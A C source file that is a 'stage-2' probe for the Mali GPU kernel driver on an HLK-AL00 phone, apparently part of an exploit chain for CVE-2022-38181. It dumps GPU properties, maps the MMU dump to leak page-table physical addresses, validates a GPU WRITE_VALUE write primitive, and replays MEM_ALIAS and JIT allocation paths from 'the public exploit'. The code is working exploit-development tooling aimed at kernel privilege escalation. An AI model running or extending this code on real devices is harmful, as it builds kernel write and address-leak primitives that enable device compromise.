/* HLK-AL00 stage-2 Mali probe (safe):
 *   A) GET_GPUPROPS: coherency, RAW_JS_FEATURES (WRITE_VALUE support), etc.
 *   B) MMU dump mmap: leaks PGD physical address + page-table entries.
 *   C) WRITE_VALUE self-test: submit a write-value job that writes a magic
 *      into our own GPU-mapped page; verify from CPU. This validates the
 *      write primitive without touching any page table.
 *
 * No memory pressure, no flags changes, no UAF involved.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <poll.h>

#include "../tools/cve-2022-38181/midgard.h"

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check { uint16_t major, minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
struct kbase_ioctl_get_gpuprops { uint64_t buffer; uint32_t size; uint32_t flags; };
union kbase_ioctl_mem_alloc {
	struct { uint64_t va_pages, commit_pages, extent, flags; } in;
	struct { uint64_t flags, gpu_va; } out;
};
union kbase_ioctl_mem_query {
	struct { uint64_t gpu_addr; uint64_t query; } in;
	struct { uint64_t value; } out;
};
struct kbase_ioctl_mem_commit { uint64_t gpu_addr; uint64_t pages; };
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
union kbase_ioctl_mem_alias {
	struct { uint64_t flags, stride, nents, aliasing_info; } in;
	struct { uint64_t flags, gpu_va, va_pages; } out;
};

struct base_jd_udata { uint64_t blob[2]; };
struct base_dependency { uint8_t atom_id, dependency_type; };
struct base_jd_atom_v2 {
	uint64_t jc;
	struct base_jd_udata udata;
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	struct base_dependency pre_dep[2];
	uint8_t atom_number, prio, device_nr, padding[1];
	uint32_t core_req;
};
_Static_assert(sizeof(struct base_jd_atom_v2) == 48, "atom must be 48");

struct base_jd_event_v2 {
	uint32_t event_code;
	uint8_t atom_number, padding[3];
	struct base_jd_udata udata;
};

#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_GET_GPUPROPS _IOW(KBASE_IOCTL_TYPE, 3, struct kbase_ioctl_get_gpuprops)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_QUERY _IOWR(KBASE_IOCTL_TYPE, 6, union kbase_ioctl_mem_query)
#define KBASE_IOCTL_MEM_COMMIT _IOW(KBASE_IOCTL_TYPE, 20, struct kbase_ioctl_mem_commit)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(KBASE_IOCTL_TYPE, 14, struct kbase_ioctl_mem_jit_init)

struct kbase_ioctl_mem_jit_init {
	uint64_t va_pages;
	uint8_t max_allocations, trim_level, group_id, padding[5];
};

#define KBASE_MEM_QUERY_COMMIT_SIZE ((uint64_t)1)

#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_SAME_VA     (1ull << 13)
#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_MMU_DUMP_HANDLE (1ull << 12)
#define BASE_JD_REQ_CS (1u << 1)

static int submit_atom(int fd, struct base_jd_atom_v2 *atom)
{
	struct kbase_ioctl_job_submit js;
	memset(&js, 0, sizeof(js));
	js.addr = (uint64_t)(uintptr_t)atom;
	js.nr_atoms = 1;
	js.stride = sizeof(*atom);
	return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
}

static int wait_event(int fd, struct base_jd_event_v2 *ev, int ms)
{
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	int r = poll(&pfd, 1, ms);
	if (r <= 0)
		return -1;
	return read(fd, ev, sizeof(*ev)) == (int)sizeof(*ev) ? 0 : -1;
}

static void *alloc_map(int fd, uint64_t pages, uint64_t *gpu_va, const char *tag)
{
	union kbase_ioctl_mem_alloc a;
	void *p;

	memset(&a, 0, sizeof(a));
	a.in.va_pages = pages;
	a.in.commit_pages = pages;
	a.in.extent = 0;
	a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR | BASE_MEM_SAME_VA;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) != 0) {
		printf("  %s: MEM_ALLOC errno=%d (%s)\n", tag, errno, strerror(errno));
		return NULL;
	}
	p = mmap(NULL, pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		 (off_t)a.out.gpu_va);
	if (p == MAP_FAILED) {
		printf("  %s: mmap errno=%d (%s)\n", tag, errno, strerror(errno));
		return NULL;
	}
	*gpu_va = (uint64_t)(uintptr_t)p;
	printf("  %s: gpu_va=0x%llx (cookie 0x%llx)\n", tag,
	       (unsigned long long)*gpu_va, (unsigned long long)a.out.gpu_va);
	return p;
}

/* ------------------------- A. GPU properties ------------------------- */
static void dump_gpuprops(int fd)
{
	struct kbase_ioctl_get_gpuprops gp;
	uint8_t *buf, *p, *end;
	int need, got;

	memset(&gp, 0, sizeof(gp));
	gp.buffer = 0; gp.size = 0; gp.flags = 0;
	errno = 0;
	need = ioctl(fd, KBASE_IOCTL_GET_GPUPROPS, &gp);
	printf("GET_GPUPROPS size probe -> %d errno=%d (%s)\n", need, errno,
	       strerror(errno));
	if (need <= 0)
		return;

	buf = malloc(need);
	if (!buf)
		return;
	memset(&gp, 0, sizeof(gp));
	gp.buffer = (uint64_t)(uintptr_t)buf;
	gp.size = need;
	errno = 0;
	got = ioctl(fd, KBASE_IOCTL_GET_GPUPROPS, &gp);
	printf("GET_GPUPROPS fill -> %d errno=%d (%s)\n", got, errno,
	       strerror(errno));
	if (got <= 0) { free(buf); return; }

	p = buf;
	end = buf + got;
	while (p + 4 <= end) {
		uint32_t hdr = *(uint32_t *)p;
		uint32_t id = hdr >> 2;
		uint32_t sz = 1u << (hdr & 3);
		uint64_t val = 0;
		p += 4;
		if (p + sz > end)
			break;
		for (uint32_t i = 0; i < sz; i++)
			val |= (uint64_t)p[i] << (8 * i);
		p += sz;

		/* print the properties that matter for the exploit */
		if (id == 1 || id == 2 || id == 3 || id == 4 || id == 6 ||
		    id == 8 || id == 12 || id == 29 || id == 30 || id == 31 ||
		    id == 32 || id == 34 || id == 60 || id == 61 || id == 63 ||
		    (id >= 35 && id <= 50))
			printf("  prop[%u] = 0x%llx (%llu)\n", id,
			       (unsigned long long)val, (unsigned long long)val);
	}
	free(buf);
}

/* --------------------------- B. MMU dump ---------------------------- */
static void dump_mmu(int fd)
{
	const size_t len = 128 * 4096;
	uint64_t *d;
	size_t off = 0, i = 0;

	d = mmap(NULL, len, PROT_READ, MAP_SHARED, fd,
		 (off_t)BASE_MEM_MMU_DUMP_HANDLE);
	if (d == MAP_FAILED) {
		printf("MMU_DUMP mmap failed: errno=%d (%s)\n", errno,
		       strerror(errno));
		return;
	}
	printf("MMU_DUMP mapped at %p\n", (void *)d);

	/* api_version > 8.4: 3 x u64 address-space config first */
	printf("  config: transtab=0x%llx memattr=0x%llx transcfg=0x%llx\n",
	       (unsigned long long)d[0], (unsigned long long)d[1],
	       (unsigned long long)d[2]);
	off = 24;

	while (off + 8 <= len && i < 16) {
		uint64_t marker = d[off / 8];
		if (marker == 0xFF) {
			printf("  end marker at offset 0x%zx\n", off);
			break;
		}
		printf("  pgd[%zu]: pa=0x%llx level=%llu\n", i,
		       (unsigned long long)(marker & ~0x7ULL),
		       (unsigned long long)(marker & 0x7));
		off += 8 + 512 * 8;
		i++;
	}
	if (i >= 16)
		printf("  (stopped after 16 page-table pages)\n");

	munmap(d, len);
}

/* ---------------------- C. WRITE_VALUE self-test --------------------- */
static int write_value_test(int fd)
{
	uint64_t jc_va = 0, tgt_va = 0;
	void *jc, *tgt;
	struct MALI_JOB_HEADER jh = {0};
	struct MALI_WRITE_VALUE_JOB_PAYLOAD pl = {0};
	struct base_jd_atom_v2 atom;
	struct base_jd_event_v2 ev;
	const uint64_t magic = 0x1122334455667788ULL;
	const uint64_t magic32 = 0xa5a55a5aULL;
	int ret;

	printf("WRITE_VALUE self-test:\n");
	jc = alloc_map(fd, 1, &jc_va, "jc-page");
	tgt = alloc_map(fd, 1, &tgt_va, "target-page");
	if (!jc || !tgt)
		return -1;

	memset(jc, 0, 4096);
	memset(tgt, 0, 4096);

	jh.is_64b = true;
	jh.type = MALI_JOB_TYPE_WRITE_VALUE;
	MALI_JOB_HEADER_pack((uint32_t *)jc, &jh);

	pl.address = tgt_va + 0x100;
	pl.type = MALI_WRITE_VALUE_TYPE_IMMEDIATE_64;
	pl.immediate_value = magic;
	MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t *)jc + 8, &pl);

	memset(&atom, 0, sizeof(atom));
	atom.jc = jc_va;
	atom.atom_number = 7;
	atom.core_req = BASE_JD_REQ_CS;

	errno = 0;
	ret = submit_atom(fd, &atom);
	printf("  submit(WV64) ret=%d errno=%d (%s)\n", ret, errno,
	       strerror(errno));
	if (ret)
		return -1;

	if (wait_event(fd, &ev, 1000) == 0)
		printf("  event code=0x%x atom=%u\n", ev.event_code, ev.atom_number);
	else
		printf("  no event within 1s\n");

	usleep(50000);
	printf("  target[0x100] = 0x%llx (expect 0x%llx) -> %s\n",
	       (unsigned long long)*(volatile uint64_t *)((char *)tgt + 0x100),
	       (unsigned long long)magic,
	       *(volatile uint64_t *)((char *)tgt + 0x100) == magic ? "PASS" : "FAIL");

	/* second job: 32-bit immediate at +0x108 */
	memset(jc, 0, 4096);
	MALI_JOB_HEADER_pack((uint32_t *)jc, &jh);
	pl.address = tgt_va + 0x108;
	pl.type = MALI_WRITE_VALUE_TYPE_IMMEDIATE_32;
	pl.immediate_value = magic32;
	MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t *)jc + 8, &pl);
	atom.jc = jc_va;
	atom.atom_number = 8;
	if (submit_atom(fd, &atom) == 0 && wait_event(fd, &ev, 1000) == 0)
		printf("  event2 code=0x%x atom=%u\n", ev.event_code, ev.atom_number);
	usleep(20000);
	printf("  target[0x108] = 0x%llx (expect 0x%llx) -> %s\n",
	       (unsigned long long)*(volatile uint64_t *)((char *)tgt + 0x108),
	       (unsigned long long)magic32,
	       *(volatile uint64_t *)((char *)tgt + 0x108) == magic32 ? "PASS" : "FAIL");
	return 0;
}

/* ---------------------- B2. MMU dump + PTE scan ---------------------- */
static void dump_mmu_scan(int fd, const char *tag)
{
	const size_t len = 128 * 4096;
	uint64_t *d;
	size_t off = 24, pages = 0, leaves = 0, nexts = 0;

	d = mmap(NULL, len, PROT_READ, MAP_SHARED, fd,
		 (off_t)BASE_MEM_MMU_DUMP_HANDLE);
	if (d == MAP_FAILED) {
		printf("MMU_DUMP(%s) failed: errno=%d (%s)\n", tag, errno,
		       strerror(errno));
		return;
	}
	printf("MMU_DUMP(%s):\n", tag);
	while (off + 8 <= len && pages < 32) {
		uint64_t marker = d[off / 8];
		uint64_t *tab;
		int shown = 0;

		if (marker == 0xFF)
			break;
		printf("  page[%zu]: pa=0x%llx level=%llu\n", pages,
		       (unsigned long long)(marker & ~0x7ULL),
		       (unsigned long long)(marker & 0x7));
		tab = (uint64_t *)((uint8_t *)d + off + 8);
		for (int i = 0; i < 512; i++) {
			uint64_t e = tab[i];
			if ((e & 0x443) == 0x443) {
				leaves++;
				if (shown < 4) {
					printf("    L3[%d] = 0x%llx (pa 0x%llx)\n",
					       i, (unsigned long long)e,
					       (unsigned long long)(e & ~0xFFFULL));
					shown++;
				}
			} else if ((e & 0x443) == 0x403) {
				nexts++;
			}
		}
		off += 8 + 512 * 8;
		pages++;
	}
	printf("  tables=%zu leaf(0x443)=%zu next(0x403)=%zu\n",
	       pages, leaves, nexts);
	munmap(d, len);
}

/* ------------------------ D. MEM_COMMIT path ------------------------- */
static void commit_test(int fd)
{
	union kbase_ioctl_mem_alloc a;
	union kbase_ioctl_mem_query q;
	struct kbase_ioctl_mem_commit c;
	void *p;

	printf("MEM_COMMIT test (alloc 25 pages, commit 0):\n");
	memset(&a, 0, sizeof(a));
	a.in.va_pages = 25;
	a.in.commit_pages = 0;
	a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	errno = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) != 0) {
		printf("  alloc errno=%d (%s)\n", errno, strerror(errno));
		return;
	}
	p = mmap(NULL, 25 * 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		 (off_t)a.out.gpu_va);
	if (p == MAP_FAILED) {
		printf("  mmap errno=%d (%s)\n", errno, strerror(errno));
		return;
	}
	printf("  user va=%p cookie=0x%llx\n", p,
	       (unsigned long long)a.out.gpu_va);

	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = (uint64_t)(uintptr_t)p;
	q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
	if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) == 0)
		printf("  commit before = %llu\n", (unsigned long long)q.out.value);

	memset(&c, 0, sizeof(c));
	c.gpu_addr = (uint64_t)(uintptr_t)p;
	c.pages = 25;
	errno = 0;
	printf("  MEM_COMMIT(25) ret=%d errno=%d (%s)\n",
	       ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &c), errno, strerror(errno));

	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = (uint64_t)(uintptr_t)p;
	q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
	if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) == 0)
		printf("  commit after  = %llu\n", (unsigned long long)q.out.value);

	for (int i = 0; i < 25; i++)
		((volatile uint64_t *)p)[i * 512] = 0xfeed0000 + i;
	printf("  touched 25 pages OK\n");
}

/* ------------------------- E. MEM_ALIAS path ------------------------- */
static void alias_test(int fd)
{
	union kbase_ioctl_mem_alloc a;
	union kbase_ioctl_mem_alias al;
	struct base_mem_aliasing_info ai[2];
	uint64_t va[2];
	void *p[2], *ap;
	const uint64_t pat[2] = {0xaaaabbbbccccddddULL, 0x1111222233334444ULL};

	printf("MEM_ALIAS test (2 regions x 4 pages):\n");
	for (int i = 0; i < 2; i++) {
		memset(&a, 0, sizeof(a));
		a.in.va_pages = 4;
		a.in.commit_pages = 4;
		a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
			     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
		if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) != 0) {
			printf("  alloc%d errno=%d (%s)\n", i, errno, strerror(errno));
			return;
		}
		p[i] = mmap(NULL, 4 * 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
			    fd, (off_t)a.out.gpu_va);
		if (p[i] == MAP_FAILED) {
			printf("  mmap%d errno=%d (%s)\n", i, errno, strerror(errno));
			return;
		}
		va[i] = (uint64_t)(uintptr_t)p[i];
		*(volatile uint64_t *)p[i] = pat[i];
	}

	memset(ai, 0, sizeof(ai));
	ai[0].handle.basep.handle = va[0];
	ai[0].length = 4;
	ai[1].handle.basep.handle = va[1];
	ai[1].length = 4;

	memset(&al, 0, sizeof(al));
	al.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	al.in.stride = 4;
	al.in.nents = 2;
	al.in.aliasing_info = (uint64_t)(uintptr_t)ai;
	errno = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al) != 0) {
		printf("  MEM_ALIAS errno=%d (%s)\n", errno, strerror(errno));
		return;
	}
	printf("  alias out: flags=0x%llx va=0x%llx pages=%llu\n",
	       (unsigned long long)al.out.flags,
	       (unsigned long long)al.out.gpu_va,
	       (unsigned long long)al.out.va_pages);

	ap = mmap(NULL, 8 * 4096, PROT_READ, MAP_SHARED, fd, (off_t)al.out.gpu_va);
	if (ap == MAP_FAILED) {
		printf("  alias mmap errno=%d (%s)\n", errno, strerror(errno));
		return;
	}
	printf("  alias user va=%p\n", ap);
	printf("  alias[0] = 0x%llx (%s)\n",
	       (unsigned long long)*(volatile uint64_t *)ap,
	       *(volatile uint64_t *)ap == pat[0] ? "match" : "MISMATCH");

	/* like the public exploit, re-map each stride chunk separately */
	{
		void *chunk[2];
		for (int i = 0; i < 2; i++) {
			chunk[i] = mmap(NULL, 4 * 4096, PROT_READ, MAP_SHARED, fd,
					(off_t)((uint64_t)(uintptr_t)ap + i * 4 * 4096));
			if (chunk[i] == MAP_FAILED) {
				printf("  chunk%d mmap errno=%d (%s)\n", i, errno,
				       strerror(errno));
				continue;
			}
			printf("  chunk%d va=%p val=0x%llx (%s)\n", i, chunk[i],
			       (unsigned long long)*(volatile uint64_t *)chunk[i],
			       *(volatile uint64_t *)chunk[i] == pat[i] ? "match" : "MISMATCH");
		}
	}
}

/* --------------------- G. JIT init trim_level=100 -------------------- */
static void jit_trim_test(void)
{
	int fd;
	struct kbase_ioctl_version_check vc;
	struct kbase_ioctl_set_flags sf;
	struct kbase_ioctl_mem_jit_init ji;
	union kbase_ioctl_mem_alloc a;
	struct base_jd_atom_v2 atom;
	struct base_jd_event_v2 ev;
	struct {
		uint64_t gpu_alloc_addr, va_pages, commit_pages, extent;
		uint8_t id, bin_id, max_allocations, flags, padding[2];
		uint16_t usage_id;
	} info;
	void *tracking, *buf;
	uint8_t free_id = 1;

	printf("JIT trim=100 test (second context):\n");
	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { printf("  open: %s\n", strerror(errno)); return; }
	memset(&vc, 0, sizeof(vc));
	vc.major = 11; vc.minor = 16;
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	memset(&sf, 0, sizeof(sf));
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) != 0) {
		printf("  setflags errno=%d\n", errno); close(fd); return;
	}
	tracking = mmap(NULL, 0x1000, 0, MAP_SHARED, fd,
			(off_t)BASE_MEM_MAP_TRACKING_HANDLE);
	if (tracking == MAP_FAILED) {
		printf("  tracking errno=%d\n", errno); close(fd); return;
	}

	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 255;
	ji.trim_level = 100;
	ji.group_id = 0;
	errno = 0;
	printf("  JIT_INIT(va=0x1000,trim=100,max=255) ret=%d errno=%d (%s)\n",
	       ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji), errno, strerror(errno));

	memset(&a, 0, sizeof(a));
	a.in.va_pages = 1; a.in.commit_pages = 1;
	a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) != 0) {
		printf("  alloc errno=%d\n", errno); close(fd); return;
	}
	buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		   (off_t)a.out.gpu_va);
	if (buf == MAP_FAILED) { printf("  mmap errno=%d\n", errno); close(fd); return; }
	*(volatile uint64_t *)buf = 0;

	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = (uint64_t)(uintptr_t)buf;
	info.va_pages = 25;
	info.commit_pages = 25;
	info.extent = 1;
	info.id = 1;
	info.max_allocations = 255;

	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)&info;
	atom.nr_extres = 1;
	atom.atom_number = 1;
	atom.core_req = 0x209; /* BASE_JD_REQ_SOFT_JIT_ALLOC */
	errno = 0;
	if (submit_atom(fd, &atom) != 0) {
		printf("  JIT_ALLOC submit errno=%d (%s)\n", errno, strerror(errno));
		close(fd); return;
	}
	if (wait_event(fd, &ev, 1000) == 0)
		printf("  alloc event code=0x%x atom=%u\n", ev.event_code, ev.atom_number);
	printf("  jit va=0x%llx\n", (unsigned long long)*(volatile uint64_t *)buf);
	usleep(20000);

	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)&free_id;
	atom.nr_extres = 1;
	atom.atom_number = 2;
	atom.core_req = 0x20a; /* BASE_JD_REQ_SOFT_JIT_FREE */
	errno = 0;
	if (submit_atom(fd, &atom) != 0) {
		printf("  JIT_FREE submit errno=%d (%s)\n", errno, strerror(errno));
		close(fd); return;
	}
	if (wait_event(fd, &ev, 1000) == 0)
		printf("  free event code=0x%x atom=%u\n", ev.event_code, ev.atom_number);
	close(fd);
	printf("  second context closed\n");
}

int main(void)
{
	int fd, ret;
	struct kbase_ioctl_version_check vc;
	struct kbase_ioctl_set_flags sf;
	void *tracking;

	setbuf(stdout, NULL);
	printf("== HLK-AL00 Mali stage-2 probe ==\n");

	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { printf("open: %s\n", strerror(errno)); return 1; }

	memset(&vc, 0, sizeof(vc));
	vc.major = 11; vc.minor = 16;
	ret = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	printf("VERSION_CHECK ret=%d -> %u.%u\n", ret, vc.major, vc.minor);

	memset(&sf, 0, sizeof(sf));
	ret = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf);
	printf("SET_FLAGS ret=%d errno=%d\n", ret, errno);
	if (ret) return 1;

	tracking = mmap(NULL, 0x1000, 0, MAP_SHARED, fd,
			(off_t)BASE_MEM_MAP_TRACKING_HANDLE);
	printf("tracking mmap=%p errno=%d\n", tracking, errno);
	if (tracking == MAP_FAILED) return 1;

	printf("\n-- A. GPU props --\n");
	dump_gpuprops(fd);

	printf("\n-- B. MMU dump --\n");
	dump_mmu(fd);

	printf("\n-- C. WRITE_VALUE --\n");
	write_value_test(fd);

	printf("\n-- B2. MMU dump after mappings --\n");
	dump_mmu_scan(fd, "after maps");

	printf("\n-- D. MEM_COMMIT --\n");
	commit_test(fd);

	printf("\n-- E. MEM_ALIAS --\n");
	alias_test(fd);

	printf("\n-- G. JIT trim=100 --\n");
	jit_trim_test();

	printf("\nstage2 done, closing\n");
	close(fd);
	printf("closed, still alive\n");
	return 0;
}